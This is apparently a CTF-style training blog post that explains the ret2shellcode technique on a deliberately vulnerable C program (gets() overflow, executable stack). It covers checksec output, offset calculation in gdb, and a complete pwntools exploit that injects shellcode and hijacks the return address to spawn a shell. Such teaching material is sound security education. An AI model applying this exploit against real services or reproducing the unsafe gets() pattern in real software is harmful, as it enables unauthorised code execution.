---
layout: post
title: ret2shellcode
date: 2021-06-12 20:05
category: pwn-training
author: stdnoerr
tags: [buffer-overflow, shellcode]
summary: An overview of ret2shellcode technique with an example
---
We will take a look at a ret2shellcode challenge.
The files can be found [here](http://google.com)

# Analysis
## Code Analysis
Lets take a look at the source code.
```c
#include<stdio.h>

// Compiled with: gcc ret2shellcode.c -o ret2shellcode -z execstack -no-pie -fno-stack-protector 

__attribute__((constructor))
void ignore_me(){
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);
}

void win(int arg1, int arg2){
    if (arg1 == 0xdeadbeef && arg2 == 0xcafebabe){
        puts("You're awesome");
        execve("/bin/sh", NULL, NULL);
    }
}

int main(int argc, char **argv, char **environ){
    char buf[0x60];
    puts("Show me your creativity :P");
    printf("For now, Imma tell you a secret: %p\n", buf);
    gets(buf);
}
```

The program has three functions; ignore_me, win and main. _main_ is a special function in C language. It is where the main functionality of the program lies. _ignore\_me_ is declared as a constructor here. Constructors are functions which are executed _before_ main. Their counterparts are called de-constructors. They are executed _after_ main.

Here _ignore\_me_ just sets up buffering for the challenge.

Lets take a closer look at _main_ function. The function first allocates 0x60 bytes for a buffer called _buf_. Then it prints two lines. The first one is not important. The second one tells us the address of buf buffer. After that, it calls gets function. The [man page of gets](https://man7.org/linux/man-pages/man3/gets.3.html) shouts "Never use this function". Because, this function does not check if the destionation buffer can hold the data. This gives rise to buffer overflow. 

And the _win_ function compares the first and second argument with some specific values and gives us shell if they match.

### Buffer Overflow
This is a situation in which a program puts data in a buffer more than its capacity. This results in overwriting memory adjacent to the data region. Mostly, buffers are on stack and sensitive data related to program execution is also stored on stack. This way buffer overflows can be a serious threat in a computer program.

Buffer overflow attacks overwrite the data related to program execution and control the program's execution. The most important data on stack is saved RIP/EIP. This is the address where the program will start execution after main function. Overwriting it with something useful can get us a shell.

Getting shell usually depends upon the situation.

# Exploitation
## Checksec
Lets first check protections enabled on the binary. This can be done with checksec tool. It comes with [pwntools](https://github.com/Gallopsled/pwntools) also.

```bash
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX disabled
PIE:      No PIE (0x400000)
RWX:      Has RWX segments
```

- Arch: tells architecture of binary.
- RELRO: tells if the GOT section is read-only or not. There are three situtation of RELRO: 
1. NO RELRO: GOT section is not read-only and it is _after_ global variables.
2. Partial RELRO: GOT section is not read-only and it is _before_ global variables.
3. Full RELRO: GOT section is read-only and it is _before_ global variables.
- Stack: tells if canary protection is enabled or not.
- NX: tells if non-executable stack protection is enabled or not.
- PIE: tells if Position Independent Execution is enabled or not.
- RWX: tells if binary has read-write-executable pages.

In this case, RELRO, Canary, NX and PIE are disabled.

## Buffer Overflow Exploitation
In Buffer Overflow attacks, first we calculate number of bytes until we reach saved RIP. We usually call it "offset". This can be calculated using cyclic patterns.

### Offset calculation
For calculation of offset, we need to generate cyclic pattern which will possibly overwrite saved RIP. If your guess didn't overwrite RIP, just increase it.

1. I generated cyclic pattern of 150 bytes using `cyclic 150`.<br/>
2. Copy the resulting pattern.<br/>
3. Start the program in gdb using `gdb ./ret2shellcode`.<br/>
4. Paste the copied pattern and you should get a Segmentation Fault error. This shows that you overwrote the saved RIP.<br/>
It should be something like this:

```bash
Program received signal SIGSEGV, Segmentation fault.
0x0000000000401238 in main ()
[ Legend: Modified register | Code | Heap | Stack | String ]
$rax   : 0x0               
$rbx   : 0x0               
$rcx   : 0x00007ffff7f9f980  →  0x00000000fbad208b
$rdx   : 0x0               
$rsp   : 0x00007fffffffdfb8  →  "baabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma"
$rbp   : 0x6261617a61616179 ("yaaazaab"?)
$rsi   : 0x00007ffff7f9fa03  →  0xfa2680000000000a
$rdi   : 0x00007ffff7fa2680  →  0x0000000000000000
$rip   : 0x0000000000401238  →  <main+78> ret 
$r8    : 0x00007fffffffdf50  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]"
$r9    : 0x0               
$r10   : 0x00007ffff7fef110  →  <strcmp+4144> pxor xmm0, xmm0
$r11   : 0x246             
$r12   : 0x0000000000401080  →  <_start+0> xor ebp, ebp
$r13   : 0x0               
$r14   : 0x0               
$r15   : 0x0               
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 

0x00007fffffffdfb8│+0x0000: "baabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma"     ← $rsp
0x00007fffffffdfc0│+0x0008: "daabeaabfaabgaabhaabiaabjaabkaablaabma"
0x00007fffffffdfc8│+0x0010: "faabgaabhaabiaabjaabkaablaabma"
0x00007fffffffdfd0│+0x0018: "haabiaabjaabkaablaabma"
0x00007fffffffdfd8│+0x0020: "jaabkaablaabma"
0x00007fffffffdfe0│+0x0028: 0x0000616d6261616c ("laabma"?)
0x00007fffffffdfe8│+0x0030: 0x2ced48e1cc2282d4
0x00007fffffffdff0│+0x0038: 0x0000000000401080  →  <_start+0> xor ebp, ebp

0x40122d <main+67>        call   0x401070 <gets@plt>
0x401232 <main+72>        mov    eax, 0x0
0x401237 <main+77>        leave  
→   0x401238 <main+78>        ret    
[!] Cannot disassemble from $PC
```
**Note**: I'm using [gdb-gef](https://github.com/hugsy/gef) plugin.<br/>
5. To calculate the offset, copy the first four characters on top of stack. It is "baab" in this case. Or you can also calculate it by copying the first word on stack. It can be determined by `x/wx $rsp`.<br/>
6. To get the offset, give the four characters or first word on stack by `cyclic -l <value>`. This yields 104 (0x68).

There is a strong correspondence between the calculated offset and the source code. The buffer is of size 0x60 and the offset is 0x68. But, why is it `sizeof(buf)+8`?<br/>
This is because the stack(frame) of main function contains only _buf_ buffer. It is adjacent to the sensitive data I was talking about earlier. The sensitive data is saved RBP and saved RIP. saved RBP is the base pointer which will be used when main returns. After saved RBP, comes saved RIP. That's why we need 8 more bytes to get upto saved RIP.

### ret2shellcode
Now we have RIP under-control. But, [what now](https://hackmd.io/@stdnoerr/rip_control)?
Since NX is disabled, the easiest way is to execute a shellcode which gives us a shell.<br/>
But, for this, we need to have something where we can put it and we need to know its location in order to return to it.<br/>
Luckily, both of these requirements are satisfied in this situation. We have a buffer we can write to and the program gives us its address.<br/>
Lets start writing our exploit script.<br/>
```py
#!/usr/bin/env python3
from pwn import *

def start():
	global p
	if args.REMOTE:
		p = remote('localhost', 1337)
	else:
		p = elf.process()

context.binary = elf = ELF('./ret2shellcode')
libc = elf.libc
start()

### Exploit Goes here ###
offset = 0x68

p.interactive()
p.close()
```
First we need to store buffer's address which is printed by the binary.
```py
p.recvline()
buf_addr = int(p.recvline().split()[-1], 16)
```
Then the shellcode we want to execute. I used pwntools shellcraft utility for this.
```py
shellcode = asm(shellcraft.linux.sh())
```
Now we need to craft such a payload which will overwrite the RIP with buffer's address and the buffer contains the shellcode.
```py
# store the shellcode
payload = shellcode
# Add junk until we reach saved RIP
payload += b'A'*(offset - len(shellcode))
# Overwrite RIP with buf's address
payload += p64(buf_addr)
```
Now just send the payload.
```py
# sendline because gets waits until a newline(\n)
p.sendline(payload)
```
Then communicate with the program by going interactive.
```py
p.interactive()
```
And BOOM! you have a shell.

## Final Exploit
```py
#!/usr/bin/env python3
from pwn import *

def start():
	global p
	if args.REMOTE:
		p = remote('localhost', 1337)
	else:
		p = elf.process()

context.binary = elf = ELF('./ret2shellcode')
libc = elf.libc
start()

### Exploit Goes here ###
offset = 0x68

p.recvline()
buf_addr = int(p.recvline().split()[-1], 16)

shellcode = asm(shellcraft.linux.sh())

# store the shellcode
payload = shellcode
# Add junk until we reach saved RIP
payload += b'A'*(offset - len(shellcode))
# Overwrite RIP with buf's address
payload += p64(buf_addr)

# sendline because gets waits until a newline(\n)
p.sendline(payload)

p.interactive()
p.close()
```
If any of you have any questions/doubts, you can reach out to me on discord (stdnoerr#7880) or on twitter (@stdnoerr).
